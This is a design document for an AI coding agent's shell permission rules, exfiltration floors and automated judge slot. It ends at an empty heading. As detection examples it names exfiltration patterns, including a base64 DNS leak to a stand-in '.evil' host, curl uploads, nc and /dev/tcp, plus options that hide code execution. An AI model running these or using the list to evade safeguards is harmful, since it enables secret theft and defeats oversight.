# Permissions: always-allow baseline and judge slot

Status: decided 2026-10-14 (issue #28). P1a, the approval rules UI (P1b) and the P2 judge call site are implemented. Scoped file, network and MCP rule enforcement (P1c) remains separate work.

This page carries the owner-approved direction for issue #28 into the repository. It has two goals:

- **P1:** make "Always allow" usable through structural command rules and scoped saved approvals, while keeping hard floors.
- **P2:** reserve one pluggable judge-model slot for automated review.

The [permission-policy contract](../architecture/permission-policy-design.md)
owns current execution and approval behavior. Implementation gaps against this
design must be reported explicitly.

## Decisions

### P1: rules and "Always allow"

**1. One rules language and one parser** for Settings, the dock and the rule files. Implemented in `src/permissions/rules/rule-specifier.ts`.

| Rule | Matches |
|---|---|
| `Bash(<prefix> *)` | every command whose static argv starts with the prefix tokens, including the bare prefix |
| `Bash(<exact>)` | exactly that static argv |
| `Edit(<abs path>)` / `Edit(<abs dir>/**)` | one path, or a directory and everything under it |
| `WebFetch(domain:<host>)` / `WebFetch(domain:*.<host>)` | exact host, or strict subdomains (only a leading `*.`) |
| `Mcp(<server>)` / `Mcp(<server>:<tool>)` | every tool of a server, or one tool |

- Parsing is strict: anything outside the grammar throws.
- Storage uses one canonical spelling.
- Legacy Store A glob patterns (`web_fetch`, `write_file:path:/abs`) never start with `Name(`. They are classified by shape and keep their glob semantics unchanged.

**2. Precedence.** deny, then mandatory per-call gates, then explicit ask rules,
then allow. Session allows count as allow.

- The first match within a class decides.
- Specificity never beats class.

**3. Bash command-rule matching** runs on the host's shell AST (`src/shared/shell-analysis.ts`, the mvdan/sh grammar). Implemented in `src/permissions/rules/shell-rule-matcher.ts`.
- Every simple command must be covered by some allow rule. Different rules may cover different parts.
- Deny and ask also look inside:
  - `$()`, backticks and process substitution;
  - subshells;
  - loop, conditional and function bodies;
  - assignment values;
  - through wrapper programs (`sudo -u root rm`).
- Unparseable input matches no allow rule.
- Wrappers are never stripped for allow.
- Code-executing runners keep their full argv in rule matching. An applicable
  prefix must include the runner and its proven literal command, such as
  `Bash(npx prettier *)`; an inner-only `Bash(prettier *)` cannot cover it.
  Opaque runner identity or an unknown runner option alone adds no hidden-code
  blocker. The persistent-prefix boundary is checked separately below.

**4. Prefix suggestion** uses the wildcard allowlist `WILDCARD_PREFIX_CATALOG` (`src/permissions/rules/shell-prefix-values.ts`), described under decision 7.
- An allowlisted entry keeps its listed token count: `git status` keeps 2, and `npm run <script>` keeps 3.
- Past the entry's own tokens, options and paths end the prefix.
- A command outside the catalog gets an exact rule for its full argv.

Suggestion length selects a candidate; the refused-prefix check must still
accept it. An edited persistent rule uses that same validation.

**4a. Refused prefixes** come from one shared list, which validates both suggestions and edited values:
- an empty prefix or bare `*`;
- shells;
- non-runner interpreters at any length (`python -c`, `node scripts/build.mjs`, `python -m x`);
- wrappers at any length (`env`, `xargs`, `sudo`, `eval`, `exec`, `source`, `timeout`, `nice`, `unbuffer`, …);
- code-executing runner prefixes without a proven literal command (`npx`, `npm`, `npm exec`, `bun x`);
- runner prefixes with option-shaped words before that command unless a literal `--` establishes its boundary;
- non-runner multi-verb tools alone or with a leading option (`git`, `git -c`, `docker`).

Prefix refusal rejects that persistent command rule. Once/session approval and
existing exact-input saved approvals retain their own requirements.

Runner prefix validation uses structural command/delegation boundaries, not an
option-arity or known-safe task table. `npx tsc`, `npm test`, `pnpm dlx tsc` and
`corepack pnpm install` can become persistent prefixes because their literal
command words are established. Options before the command require a literal
`--` boundary; validation does not guess which option consumes the next word.
Ambiguous forms keep their ordinary ask and can be covered by an applicable
exact-input saved grant, subject to the other permission gates. A valid prefix
does not prove that the command or task contents are read-only.

**5. Shell verdict.** The blanket `shell → high` in `resolveUserApprovalVerdict` is no longer the first answer.
- An unreviewed shell ask carries the host's rule-classifier verdict (`ApprovalRequest.ruleVerdict`): read-only is LOW, ordinary is MEDIUM, destructive is HIGH.
- Destructive commands stay once-only.
- With no verdict at all, the fallback is still HIGH (fail closed).

**6. Persistence.**
- "Always allow" for a project writes the per-project rule file in Ave home: `<ave home>/permissions/project-rules/<identity>.json`. Identity, repository discovery, the home boundary, and retained legacy rules follow [Project Rule Scope](../architecture/permission-policy-design.md#project-rule-scope). The file is re-read when it changes on disk. Ave never writes rules into the user's repository.
- "Everywhere" writes the user-global scope, which is Store A (`<ave home>/permissions.json`) extended in place.
- Deny-always uses the same files.
- Every session approval (shell, browser, terminal and any other exact tool approval) is held in memory under the root conversation: the conversation and every sub-agent spawned from it, at any depth, share it, and separate root conversations never do. A session approval without a conversation is refused (`missing-session`), and the dock disables "Allow for session" for such a request and says why. The root comes from one resolver, `createRootSessionResolver` over the sub-agent runner's recorded origins (live and restored children), which the judge also uses. An app restart clears all session approvals.

**7. Existing Store B entries** (exact tuples) keep matching unchanged and are never converted to prefixes.
- The shared approval content presents an editable host-derived shell rule suggestion in both the conversation dock and the approval lane card. Project scope is selected initially; Everywhere writes the user file. A saved command rule creates no exact Store B approval.
- Allow for session records an exact Store B approval under the root conversation id. It does not write a rule file or authorize another root conversation. Existing entries keep their original identities.
- Destructive tools are refused as allow prefixes at every length (`rm`, `shred`, `dd`, `mkfs`, `wipefs`), as are bare or recursive `chmod`/`chown`/`chgrp` prefixes. The matcher's destructive floor also reads each command's argv, so recursive or forced deletion in any option order or spelling (`rm -v -r`, `rm --recursive --force`), recursive or world-writable permission changes and `find -delete` are never covered by an allow rule.
- **Wildcard allowlist (owner decision 2026-10-23).** A `Bash(<prefix> *)` allow rule may be suggested or stored only when the prefix starts with an entry of `WILDCARD_PREFIX_CATALOG` (`src/permissions/rules/shell-prefix-values.ts`) and keeps at least that entry's token count.
  - The catalog replaces the earlier arity table. It lists read-only inspection (`ls`, `cat`, `head`, `tail`, `wc`, `grep`, `rg`, `find`, `pwd`, `du`, `df`, `which`, `stat`), repository inspection (`git status/log/diff/show/rev-parse/ls-files/blame`, `git branch --list`), and container inspection (`docker ps/images/logs`).
  - An entry must not be widenable. Package-script runners (`npm/pnpm/yarn/bun test`, `… run <script>`) are not in the catalog, because a script body or test file is agent-editable code, the same reason interpreters are refused. `git fetch` is not in the catalog, because it is network egress to any URL. Both get exact rules only, so `npm test` and `npm run build` stay one click as `Bash(npm test)` and `Bash(npm run build)` (round 3, 2026-10-23).
  - `kubectl` is not in the catalog (round 4). Like other network and credential clients it gets exact rules only: its flag grammar re-targets the cluster through combined short flags (`-As https://…`), reads Secrets through manifests (`-f creds.yaml`, `-k ./overlay`) and writes files (`--profile-output`) in more spellings than a denylist can bound.
  - Exact `kubectl` rules are still refused for the following, wherever they appear:
    - credential or cluster re-targeting: any single-dash cluster containing `s`, `--kubeconfig`, `--server`, `--token`, `--context`, `--cluster`, `--user`, `--as`, `--as-group`, `--as-uid`, `--certificate-authority`, `--client-*`, `--insecure-skip-tls-verify`, `--tls-server-name`, `--username`, `--password`;
    - `--raw`, and the file writers `--profile`, `--profile-output` and `--cache-dir`;
    - manifest reads with `get`/`describe` (`-f`/`--filename`, `-k`/`--kustomize`);
    - secrets (`secret`, `secrets`, `secret/<name>`, `secrets.v1`, or one item of a comma list).
  - Accepted risk: runner configuration flags (`--userconfig`, `--globalconfig`, `pnpm --config.*`, `--dir`, `bun -c`/`--config`) are not refused on exact runner rules. An exact `npm test` or `npm run build` rule already runs agent-editable code, the package scripts and test files, so such a flag does not widen what the user approved. The flags that load code from outside the project or switch it (`--script-shell`, `--node-options`, `--preload`, `--prefix`, `--cwd`, `--filter`, `-r`, `-w`) stay refused.
  - No rule, exact or wildcard, covers a package-script runner (`npm`, `pnpm`, `yarn`, `bun`) with options that load other code or switch the project: `--script-shell`, `--node-options`, `--preload`, `--prefix`, `--cwd`, `--filter`, `-r`/`--recursive` or `-w`/`--workspace`.
  - Every other command is suggested only as an exact rule for its full argv, with nothing appended, and only when that argv spells back unchanged. A hand-typed wildcard outside the catalog is refused at the store with `invalid-rule`.
  - To add an entry, confirm that no argument a trailing `*` can append reaches a destructive or irreversible form, and that its writing and code-running options are caught by `shellOptionEffect`. Then add a hit test and a miss test.
  - Structural refusals (wrappers, shells, interpreters, runners, destructive and irreversible argv) still apply first, to exact rules as well.
  - A file written before the allowlist may already hold such an allow rule. It is not migrated or rewritten. It loads inert: Settings lists it with the reason "not on the known-safe list" (en/ko) and a working Remove, other writes keep it as stored, and decisions never match it (`storedRuleInvalidReason`). Any other refused stored rule still makes the whole file corrupt.
- **Irreversible commands never become allow rules,** exact or wildcard. The dock does not suggest them, the store refuses them, and the host rejects a save with `invalid-rule`. Once and session approvals stay available, and deny rules may still name them. The list (`isIrreversibleShellArgv`):
  - Always: `mv`, `cp`, `install`, `tee` (any file operand without `-a`), `truncate`, `unlink`, `dropdb`.
  - `git clean` unless `-n`/`--dry-run`; `git reset --hard/--merge/--keep`; `git restore` unless index-only (`--staged` without `--worktree`); `git stash drop/clear`.
  - `git checkout` with any operand, because `git checkout <name>` restores a file of that name as readily as it switches branch. The exception is `-b <new> [<start>]` without `--` or paths; use `git switch <branch>` for a storable exact rule. `-f`, `-p`, `-B`, `--ours`, `--theirs` and `--` are always refused.
  - `git prune`; `git gc --prune*`; `git tag -d/--delete`; `git remote remove/rm`; `git pull -f/--force`; `git reflog expire/delete`; `git worktree remove -f/--force` and `git worktree prune`; `git update-ref -d/--stdin`; `git fetch -f/--force/-p/--prune/--prune-tags` and `+ref` refspecs.
  - `git switch -f/-C/--discard-changes`; `git branch -d/-D/-M/-C/-f/--delete`; `git push -f/-d/--force/--force-with-lease/--delete/--mirror/--prune`, and `+ref` or `:ref` refspecs.
  - `docker`/`podman`/`nerdctl`/`docker-compose` `prune`/`rm`/`rmi`, and `compose down -v/--volumes/--rmi`.
  - `kubectl delete/drain`, and `kubectl apply/replace --prune/--force`.
  - `gh … delete`, `gh api -X/--method DELETE`; `helm uninstall/delete`; `terraform`/`tofu` `destroy`, `apply -destroy` and `state rm`; `aws` `rm`/`rb`/`delete-*`/`terminate-*`/`remove-*` operations and `--delete`.
  - `rsync --delete*`/`--remove-source-files`; `ln -f`; `redis-cli flushall/flushdb`; `npm`/`pnpm`/`yarn` `unpublish`; `xattr -c/-d`.
  - A dynamic word counts as the worst case.
- `chmod` modes count as world-writable when written as long octal modes (`00777`), when copied from another class (`o=u`, `o=g`), and with `--reference=`. A leading removal such as `-x` or `go-w` is the mode operand, not an option. A mode the grammar cannot read refuses a stored rule but never triggers the floor, so once and session choices remain.
- Network clients (`curl`, `wget`, `ssh`, `rsync` and similar) get no reusable allow suggestion until host-scoped network rules exist; they keep once and session choices.
- The dock names the directory a project rule applies to, which is the repository root when one is found, not the execution directory.
- A rule save reports `invalid-rule` for a rule that fails validation or does not cover the command, and `rule-save-failed` when a valid rule cannot be written.
- Settings presents user and project rules together with persistent and session exact approvals in one revocable list. Project enumeration preserves the identity stored in each file, including retained exact-directory scopes. A file whose stored root no longer derives its own name is reported as unavailable, and its rules are still listed and revocable by that stored identity without rewriting the root.
- An edited rule is normalized by one shared function before it is checked: outer and inner whitespace is trimmed and runs of spaces or tabs in a `Bash(...)` body collapse to one space. The dock previews the normalized rule, and the host save path applies the same function; the rule store's parser stays strict for every other writer. The host validates edited rules against the live command and the same refused-prefix policy used by the rule store. A save failure keeps the approval pending. Credential, destructive and other forced one-shot requests cannot acquire remembered allows.
- A corrupt Store A, Store B or project file fails clearly with a visible error.
- Corrupt files are never silently dropped and never overwritten.

**8. Writes.**
- Write rules are path-scoped `Edit(<root>/**)`, resolved with realpath at decision time.
- Sensitive paths and Ave's own config, permission and hook files are floors, checked before any allow rule.
- Symlink escapes ask.

**9. Network.** `WebFetch(domain:...)` rules feed the host-mediated fetch
allow-list. They do not confine shell egress; the shell sink checks below remain
necessary.

**10. MCP.**
- Always-allow is per tool by default; per server is an explicit option.
- A destructive annotation, or no annotation, keeps ask. Annotations never auto-allow by themselves.

**11. Out-of-directory.** The dock offers depth candidates (file, parent, project-like root) resolved by the host.

**12. Floors.** These are never always-allowable, in any mode:
- sensitive and secret paths;
- Ave config, permission stores and hooks;
- hardline destructive patterns;
- credential exfiltration;
- privilege escalation;
- plugin and agent capability grants.

### P2: judge slot

**1. One seam.** `PermissionJudge` is the automated-decision interface in
`src/permissions/judge/`. The call site reuses that engine, the existing reviewer
dispatch, canonical DLP redactor, audit writer and `DeferredQueue`.

The `builtin-llm` provider retains the existing `LlmRiskClassifier`,
`max(rule, llm)` verdict, verdict cache, approval provenance and dispatch outcome.
Absent judge settings or a valid empty chain leave existing auto-mode behavior
intact; they do not disable the existing reviewer. Relocation must preserve every
existing auto-mode test unchanged, including eligible host-built-in `meta` calls.

**2. Settings and model selection.** The canonical persisted shape is an ordered
`permissions.judge.chain`. The [settings parser](../../src/permissions/judge/judge-settings.ts)
owns all fields, defaults and validation. For example, a local selection stage
followed by the current reviewer model is configured as follows:

```json
{
  "permissions": {
    "judge": {
      "chain": [
        {
          "provider": "external",
          "id": "selection",
          "escalateBelow": 0.8,
          "external": { "command": ["/opt/example/judge"] }
        },
        { "provider": "builtin-llm", "id": "review" }
      ],
      "mode": "shadow",
      "categories": { "shell": true, "write": true, "network": false }
    }
  }
}
```

- A valid empty chain turns the configured chain off; legacy auto-review remains.
  The earlier single-stage `provider: "off" |
  "builtin-llm" | "external"` form is accepted on read and serialized as a
  chain on save. Mixing the two forms is invalid.
- A configured chain defaults to `shadow`. Shadow records the chain's result
  without applying it; the existing approval path
  remains authoritative, including when the breaker is already open. Shadow
  creates no judge-induced deferred entries and does not change breaker counters.
  In `active`, the chain's result decides eligible calls.
- Settings offers ordered stages, provider/transport, mode, categories and a
  model picker. Its English and Korean text use the same setting semantics.
  Shell and write default on; network defaults off.
- A builtin stage may set `model: "<provider>/<model>"`. The first slash
  separates the provider from the model; model ids may contain further slashes.
  The picker uses configured provider/model options, including the configured
  endpoint's discovered models and saved model selection, as the chat picker
  does. Omitting `model` follows the permission reviewer model.
- `permissions.judge.model` is the permission reviewer model: the model the
  auto-mode reviewer runs on and the default for builtin stages. The user picks
  it in Settings > Permissions with the chat model chooser, from the connected
  API models. `null` is the stored "unset" state, not a missing default: the
  reviewer then runs on the active chat model and follows it, because every
  chat-model change re-wires the reviewer. No fixed default model constant is
  the effective default.
- A selected model must be used exactly. Missing credentials, an unavailable
  provider or a removed model never silently selects a different model. For
  the reviewer model this fails every review as `unavailable` (foreground asks
  with a modal, headless denies) instead of degrading to the rule classifier
  or the chat model, and Settings marks the selection unavailable.
- Stage ids are unique within the chain. `escalateBelow` is an external-stage
  confidence threshold in `[0, 1]`; builtin risk verdicts have no confidence and
  do not accept that field.
- Read issues are visible. A rejected chain retains typed `chainRejected`
  metadata and enters the existing unavailable fallback; it does not become
  explicit off, a partial chain or an implicit builtin provider. In normalized
  `active` mode, it asks with forced approval in the foreground and denies plus
  defers headless. In `shadow`, rejection only records the observation and keeps
  the authoritative auto/headless baseline, without a judge-induced queue entry.
  Warnings for other fields retain their normalizer defaults without blocking an
  otherwise valid chain.
- A fatal settings-file read, JSON parse, root-object or permissions-structure
  failure cannot recover a trustworthy mode. The host carries `settingsUnreadable`
  and conservatively applies the existing unavailable fallback to judgeable
  categories: forced foreground approval or headless deny plus defer, without
  legacy/provider fallback. This changes the effective host failure response,
  not the persisted mode or normalizer defaults. A missing file or block remains
  valid off; a parsed rejected shadow chain retains the baseline described above.
- Invalid writes fail before persistence, and saving preserves unrelated
  settings. If runtime refresh fails after a save, the host's write receipt
  restores the original, unnormalized judge subtree, including its absence.
  Compare-and-swap permits rollback only while that subtree still equals the
  value just written; a later manual change is preserved and the conflict is
  reported rather than overwritten. The [settings store](../../src/permissions/permission-settings-store.ts)
  owns the write and rollback contract.

**3. Placement.** Deny and mandatory floors, then explicit ask rules, then allow
rules and saved grants, then the mode matrix, then the judge, then approval.
The call site judges only calls still undecided after those earlier gates and
only in enabled categories. A bare ask from a mandatory gate is not an invitation
to the judge.

No stage overrides a rule, floor, capability grant, remote-controller request or
`strict` mode. A suggested rule is advisory; the judge never persists rules.
The existing trust and approval requirements remain authoritative.

**4. Chain decisions.** Stages run in order. `ask`, a confidence below
`escalateBelow`, or missing confidence when a threshold is configured advances
to the next stage. An `allow` or `deny` meeting the threshold is final; without
a threshold, `allow` and `deny` are final directly. A stage failure advances to
the next stage within the chain deadline. The last stage's ambiguity asks the
user. All stages receive the call context without tool results.

**5. Input and output.** The host supplies recent user messages, the normalized
tool call, cwd/project root, effective sandbox state, rule verdict, policy text
and mode. Tool results are excluded. The canonical DLP redactor runs before
external transport and audit. The [shared contract](../../src/permissions/judge/judge-contract.ts)
owns request/verdict types, and the [engine](../../src/permissions/judge/judge-engine.ts)
owns escalation, hook and audit semantics. The [external adapter](../../src/permissions/judge/external-judge.ts)
owns transport framing and output bounds. Malformed output is a failure.

**6. External transport and settings floor.** A command is a non-empty argv array
with an absolute executable path, launched without a shell. A URL is HTTPS or
loopback HTTP and contains no embedded credentials. Exactly one transport is
set. Commands receive a minimal environment allow-list plus validated configured
variable names; runtime secrets are not forwarded. Stderr is bounded, redacted
and audited, never interpreted as a verdict.

The entire `permissions.judge` subtree is user-only. The Settings UI or a manual
user edit may change it; an agent cannot write it through a settings tool,
permission rule, saved grant or judge decision. Existing path protections for
application configuration remain enforced independently.

**7. Lanes and failures.** An active foreground `deny` blocks the invocation;
`ask` requests user approval. A timeout, provider error, malformed verdict or
unavailable final stage never allows and asks with the forced approval surface.
In headless execution, an active non-allow decision denies the current invocation
and appends an item to the existing `DeferredQueue`. An open breaker asks in the
active foreground lane or denies and defers in the active headless lane; shadow
keeps the pre-judge path.
Caller cancellation remains terminal; internal contract violations and failures
to write the active audit propagate instead of becoming an approval.

For `builtin-llm`, successful LOW allows in both lanes. Foreground MEDIUM allows
only under the existing `autoApprove: "medium"` threshold and without an explicit
approval requirement; HIGH asks. A builtin foreground `ask` advances to any next
stage before requesting approval. Headless MEDIUM/HIGH map to a final `deny`
and defer, without advancing to a later stage. Failed
reviewer outcomes never map their conservative verdict into an allow, including
when `fallbackOnError` is `"rule"`. Existing foreground auto-approval-off behavior
and failure metadata remain unchanged.

**8. Breaker.** The default thresholds are 3 consecutive or 20 total final judge
denials per root conversation, configurable in judge settings. Counts span the
whole chain. An `allow` resets the consecutive count; `ask`, timeouts and other
failures neither increment nor reset it. Intermediate verdicts do not count, and
shadow does not mutate counters. Once open, the breaker remains open until the
conversation ends; there is no Settings reset control. Subagents resolve to the
same root conversation for breaker and judge audit identity. Deferred entries retain the
actual requesting session so later approval returns to the correct conversation.
Rewiring settings does not create a fresh counter for that conversation.

**9. Hooks.** `beforeJudge` may redact the judge's input or short-circuit to
ask/deny. It cannot change the executing invocation. `afterJudge` may only keep
or downgrade a decision (`allow → ask → deny`).

**10. Audit and verification.** The existing writer records root session, tool,
argument hash, redacted request, provider id/version, rationale, latency and
fallback. Each executed stage records its verdict, confidence, model and latency.
Active decisions use the HMAC-protected permission audit; shadow uses the shadow
channel. Active audit failure prevents execution.

Module tests establish chain and adapter semantics. Call-site acceptance also
requires parity through the real foreground and headless dispatch lanes,
unchanged auto-mode tests, deferred/root-session integration, settings write
protection, and changed-flow Settings UI validation. A mocked classifier test
alone does not establish dispatch parity or a live provider's behavior.

### Deviations from the issue text

- The breaker counts per session (3 consecutive / 20 total) rather than per turn (10 of the last 50).
- `rule-only` is collapsed into `provider: off`.

## Delivery

The baseline work used `integration/permissions`. The approval rules UI is delivered through `integration/permissions-2`.

- **P1a** (this change): rules language, parser, shell matcher, refused list, arity suggestion, Store A extension with `ask`, per-project rule files, corrupt-file handling for Store A and B, removal of the blanket shell → HIGH. No UI.
- **P1b:** implemented in the shared approval content and Permissions Settings, with project/user rule persistence, conversation-scoped exact approvals, unified revoke and English/Korean copy.
- **P1c:** path-scoped `Edit`, host-scoped `WebFetch`, `Mcp`, and out-of-directory depth.
- **P2:** reuse `src/permissions/judge/`; land auto-mode relocation with the call site after P1a. The call site owns deferred-queue wiring, root-session mapping, Settings storage/UI with English and Korean text, and the judge-settings write floor.

## P1a implementation notes

### Where the code is

- `src/permissions/rules/rule-specifier.ts`: the grammar, plus the pure host and MCP matchers that P1c will wire in.
- `src/permissions/rules/shell-prefix-policy.ts`: the suggestion; `shell-prefix-values.ts` holds the refused list and the wildcard allowlist.
- `src/permissions/rules/shell-rule-matcher.ts`: the AST walk and deny/ask/allow evaluation.
- `src/permissions/rules/rule-files.ts`: rule validation and `PermissionRulesFileCorruptError`.
- `src/permissions/rules/project-rule-files.ts`: per-project files in Ave home.
- `src/permissions/rules/rule-scopes.ts`: the project-scope cache for the synchronous decision path.

### Decision path

`PermissionManager.checkDetailed` takes two new context fields:

- `ruleSubject: { kind: "shell", command, dialect, cwd? }`, set for canonical
  `bash` and `powershell` calls with a known dialect;
- `projectRulesCwd`, which the tool pipeline sets for Bash after awaiting
  `ensureProjectRulesLoaded`. PowerShell has no project command-rule scope.

Checks run in this order:

1. Deny decides at layer 1.
2. A corrupt Store A, project file or Store B returns a forced ask that names the file for every non-read call. Reads keep the normal matrix so the app stays usable while the file is repaired. Settings identifies unavailable files without overwriting them; the user repairs the file outside the rule list. A corrupt Store B no longer blocks every tool call; the error is logged with the file name.
3. An identified sensitive-path or credential/sink signal decides at layer 2 as
   a forced, never-remembered prompt, before any allow rule or saved approval.
4. Explicit ask rules decide at layer 2 as forced, never-remembered prompts.
   They also win over `allow` mode.
5. Applicable allow rules decide at layer 3 and saved approvals at layer 5.
   Both may satisfy an ordinary shell ask.
6. Without an applicable rule or grant, an ordinary shell reason keeps the
   category/mode path at layer 6 asking. It does not set `forceModal` and remains
   rememberable, subject to existing approval-scope and risk requirements.

The Layer-numbered gates already in place (remote controller, overlay, strict) are unchanged.

### Allow is refused for input the matcher cannot reason about

- parse failure or unsupported syntax (`case`, `select`, `((…))`, coprocesses);
- opaque word expansions (brace expansion, `${x/a/b}`, `$"…"`);
- any substitution;
- command-scoped or assignment-only environment changes (`GIT_DIR=… git status`, `PATH=…; git status`);
- write redirections other than `/dev/null`;
- function definitions;
- a dynamic program name;
- any command the rule classifier grades destructive (the floor).

### Deny and ask cannot see everything

For `Bash(...)` rule matching, they cannot see inside hidden code
(`hiddenCodeReason` in `shell-prefix-policy.ts`). Visibility governs whether a
command rule can inspect execution. Opaque syntax can retain structural rule
blockers without becoming a credential/sink floor:

- a non-runner shell or interpreter given code by any route: `-c`/`-e`, a stdin pipe (`echo … | bash`), a here-string, a here-document, `-s`, `-`, a script file or module (`bash x.sh`, `perl x.pl`, `python -m x`); informational-only `--version`/`--help` forms do not supply code;
- code carriers: `eval`, `source`/`.`, `trap`, `hash -p`, `alias`, `enable -f`, `bind -x`, `mapfile -C`, `complete -C`, `fc`, `at`, `crontab`, `tmux`, editors, string-joining wrappers (`watch`, `flock -c`, `su -c`, `env -S`);
- code-carrying variables (`GIT_SSH_COMMAND=… git fetch`, `PAGER`, `LESSOPEN`, `BASH_ENV`, `PATH`, …);
- options that run a command: `find -exec`, `sed` `e` / `s///e` / `-f`, `rg --pre`, `tar --to-command`/`-I`/`--use-compress-program`, `less +!`, `git -c`/`--ext-diff`/`--textconv`/`-O`/`--upload-pack`, `man -P`, `rsync -e`, `ssh -o ProxyCommand`, `fd -x`, …;
- unsupported syntax.

A deny rule that matches a visible command decides first. Otherwise, when any deny or ask `Bash(...)` rule exists and the command contains hidden code, the decision is a per-call `forceModal` ask before allow rules and saved grants, even in `allow` mode. Hidden code is never covered by an allow rule. Options that write (`sed -i`/`w`, `tar -x`, `less -o`, `--output`, `find -delete`) also keep an allow rule from matching.

Hidden code alone adds no `ordinaryAsk`. Without explicit restrictions, credential/sink evidence, opaque bindings or retained file-execution provenance, statically bound direct interpreter forms such as `python -c`, `perl -e`, `node -e`, `node x.js`, `python x.py`, `bash -c ls` and `pwsh -c Get-Date` follow normal handling in allow mode. Their rule-visibility limits do not prove that their contents are read-only.

An opaque runner prefix alone is not hidden code for rule matching. Runner
argv remains available to raw command rules regardless of task or subcommand
spelling. That visibility does not inspect package or script contents. Option
spelling does not add a hidden-code blocker; the structural persistent-prefix
check still rejects an ambiguous command boundary. The inner command is not a
transparent alias.

### Not yet enforced

`Edit`, `WebFetch` and `Mcp` rules parse but are not enforced yet. Writing them is refused, and a file that holds one is corrupt. This stops a stored rule from being a silent no-op that the user believes is in force. P1c lifts this by adding their kinds to `ENFORCED_RULE_KINDS`.

### Shell classification buckets

Credential/sink analysis has three outcomes. An identified floor takes precedence
when the same input also has an ordinary reason. Other existing hard-deny,
destructive, explicit-ask and one-shot requirements retain their own authority.

| Bucket | Signal | Decision without another controlling rule |
|---|---|---|
| Floor | Sensitive/credential paths or retained credential-store, certificate-export and transport/sink catalogue effects | Per-call ask with `forceModal`; no saved approval, allow rule or mode bypass |
| Ordinary | Parser refusal, analysis-budget exhaustion, opaque bindings, retained file-execution provenance, or an opaque package/code-runner prefix | `ordinaryAsk` / `ordinaryShellAsk` at layer 6; no `forceModal`; applicable rules and saved grants may cover it |
| Normal | No credential/sink floor or ordinary reason | Existing category, mode, rules and grants |

An ordinary ask remains rememberable under the existing approval-scope and risk
requirements. An unparseable command cannot match a `Bash(...)` allow rule, but
that matching limit does not turn it into a per-call floor or invalidate an
otherwise applicable tool allow rule or saved grant.

Path inspection snapshots policy roots for one decision and bounds filesystem
and glob work. Exhaustion keeps an ordinary reason and prevents a command-prefix
allow match. Remaining visible literal paths still receive lexical credential
checks, and explicit upload arguments retain their sink checks. An unresolved
alias beyond the work limit remains opaque; the scan does not claim to resolve
every filesystem alias after exhaustion.

These buckets describe the permission decision. A hard deny rejects the request
and cannot be approved; a forced per-call ask permits only that approval step.
Neither an ordinary grant nor per-call approval overrides execution-time path
authority or unsupported-syntax rejection. For example, `npx prettier .` can be
covered by an applicable runner command rule, while `source ./setup.sh` remains
rejected by the separate path-authority contract even after a permission grant.

### Retained credential and sink floors

Sensitive-path arguments to shell commands remain enforced by
`src/tools/shell-path-policy.ts` at execution, independently of rules.

**Sensitive-path floor** (`shellSensitivePathSignal`). A path from
`sensitive-paths.ts` anywhere in the command line, including argv, `=value`,
`@file`, redirections, assignments, loop lists, executed substitutions and
literal inline code, is never covered by an allow rule and forces a per-call
ask in `checkDetailed` in every mode. `~`, `~user`, `$HOME` and `${HOME}` normalize
to a home directory; other expansions (`$(echo ~)/.aws/credentials`) keep their
literal tail; brace expansion is expanded; a glob is instantiated against the
sensitive names that exist where it would expand. After the work limit, a
bounded fallback checks possible sensitive glob and brace paths without proving
filesystem existence; possible credential reach retains the floor. Plain budget
exhaustion without credential or sink evidence remains ordinary.
File-input values such as
`--env-file=.env` retain this scan; a valueless `--env-file` retains its implicit
`.env` input. These are file-input checks, not runner option policy.
The permission-manager ask does not authorize a sensitive-path operation that
the execution gate forbids.

**Credential-exfiltration floor**
(`src/permissions/rules/shell-exfiltration.ts`). A command is exfiltration when
one subcommand sends data off the machine and that data comes from a file or
secret. It covers:

- `curl`/`wget` with a file-sourced body, header or upload: `@file`, `-F x=@`,
  `-T`, `--post-file`, or any argument built from a `$(…)` that reads a path;
- `scp`/`rsync` to a remote destination, and `sftp` to a host;
- `nc`/`ncat`/`socat` fed from a file, a here-string or a path-reading pipeline
  stage;
- sensitive-path arguments to a sender;
- any argument of a network-capable program built from a `$(…)` that reads a
  path (`nslookup $(cat key|base64).evil`), except multi-purpose tools whose
  arguments routinely carry file text (`git`, `gh`, `npm`, `docker`, …);
- reader-independent: a sensitive path anywhere together with a network-capable
  program (the shared table includes `curl`, `wget`, `ssh`, `scp`, `rsync`,
  `openssl`, `nc`, `socat`, `telnet`, `nslookup`, `dig`, `gh`, `aws`, `gcloud`,
  `az`, `http` and `git`), a `/dev/tcp` or `/dev/udp` redirection, or hidden code
  anywhere in the same command line.

Senders are seen through wrappers, `busybox`, and literal `sh -c` / `eval` /
here-documents. The check applies to the whole compound command. It produces a
HIGH rule-classifier verdict, no allow-rule match, and a forced per-call ask in
`checkDetailed` in every mode. Unknown code alone does not establish a sender.
Plain GETs, form fields without `@`, local `rsync`, `scp` downloads and `git push`
do not establish this floor by themselves.

### Opaque runner prefixes

`SHELL_PREFIX_POLICY.packageRunners` is the canonical runner-identity source, including `npm`, `pnpm`, `yarn` and `bun`. `opaqueRunnerReason` returns `opaque runner prefix` through the shared `SHELL_PREFIX_POLICY.wrappers` grammar, including versioned runner spellings and supported executable/script suffixes. A runner receives an ordinary ask without an applicable rule or grant. No runner option allowlist, source classification, registry policy or package-task model assigns its bucket. An unknown option, remote package operand or registry choice alone is not a credential/sink floor.

Code-executing runners are never allow-rule-transparent wrappers. A persistent
command prefix includes the runner and proven literal command, with a literal
`--` required when options precede that command. Literal downstream
command candidates are inspected only to retain known credential, reader and
sender effects, including original substitution metadata; this inspection does
not strip runners from rule matching or infer safe argv from option spelling.
For example, `npx curl -T file http://e` retains its upload floor, while `npx curl http://e` has the ordinary runner reason unless another signal applies. Literal inline shell/code arguments still receive structural credential and sink inspection. Code visibility alone does not create an ordinary reason; unresolved command targets or code bindings do.

Known sinks remain visible through the shared wrapper grammar in `wrapperCommand` (`wrapperPrefixLength` exposes its proven argv boundary). Setup operands such as a scheduling priority, CPU mask, lockfile or root directory precede the inner command. The login `-` is a flag rather than a user operand. Explicit wrapper command strings and the entire tail passed to a default shell receive bounded shell inspection. Unsupported options and opaque bindings request ordinary approval and leave the command position uncertain. Every remaining position stays a floor-only candidate, including provisional setup operands; uncertainty never hides the tail from credential or sink inspection. Self-contained `--name=value` options retain the following command position. An independent credential or sink floor takes precedence over grants and allow rules. These sink-only views preserve native identity: a forwarded native `curl` is not a PowerShell cmdlet alias. This inspection supplies no allow-rule coverage.

The shared prefix source also marks declared interpreter/code operands. Those operands receive generic credential/sink inspection through literal delegates; their words do not become command candidates in another language. This role adds no runner-option policy or rule coverage.

### PowerShell analysis and general provenance

